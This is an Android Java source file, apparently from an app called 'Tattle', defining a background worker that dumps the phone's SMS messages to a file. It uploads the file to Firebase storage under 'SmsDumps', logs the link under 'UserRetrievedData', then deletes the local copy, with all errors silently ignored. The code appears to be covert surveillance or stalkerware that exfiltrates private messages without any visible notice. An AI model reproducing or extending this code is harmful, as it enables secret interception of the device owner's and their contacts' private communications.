package com.globalsolutions.Tattle.DataUploadServices;

import android.content.Context;
import android.net.Uri;
import android.os.Environment;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
import com.globalsolutions.Tattle.OtherUtils.SmsHelper;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;

public class SmsUploadService extends Worker {
    public static final String TAG = "SMSUPLOADSERVICE";
    FirebaseAuth firebaseAuth;
    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    StorageReference storageReference;
    SmsHelper smsHelper;
    Context context;
    SharedPrefs sharedPrefs;

    public SmsUploadService(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseDatabase = FirebaseDatabase.getInstance();
        databaseReference = firebaseDatabase.getReference();
        sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());

        smsHelper = new SmsHelper(context);

        smsHelper.dumpSMS();
            storageReference = FirebaseStorage.getInstance().getReference();
            getFileToUpload();
        Data outputData = new Data.Builder().putBoolean("fileUploaded", true).build();
        return Result.success(outputData);
    }

    public void getFileToUpload() {
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
                .mkdirs();
        File dir = Environment
                .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
        File logFile = new File(dir, "backup.txt");

//        File logFile = new File(backupDBFolder, "temp.txt");
        if (logFile.exists()) {
            uploadFile(logFile);
        } else {
        }
    }

    private void uploadFile(File file) {

        StorageReference mStorageReference = this.storageReference.child(sharedPrefs.getUniqueId()).child("SmsDumps").child(System.currentTimeMillis() + "." + "txt");
        Uri uri = Uri.fromFile(file);
        mStorageReference.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                mStorageReference.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                    @Override
                    public void onSuccess(Uri uri) {
                        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("SmsDump").push().setValue(uri.toString()).addOnSuccessListener(new OnSuccessListener<Void>() {
                            @Override
                            public void onSuccess(Void aVoid) {
                                deleteFile();
                            }
                        }).addOnFailureListener(new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception e) {
                            }
                        });
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                    }
                });
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
            }
        });
    }

    public void deleteFile() {
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
                .mkdirs();
        File dir = Environment
                .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
        File logFile = new File(dir, "backup.txt");
        if (logFile.exists()) {
            try {
                logFile.delete();
            } catch (Exception e) {
            }
        } else {
        }
    }

}
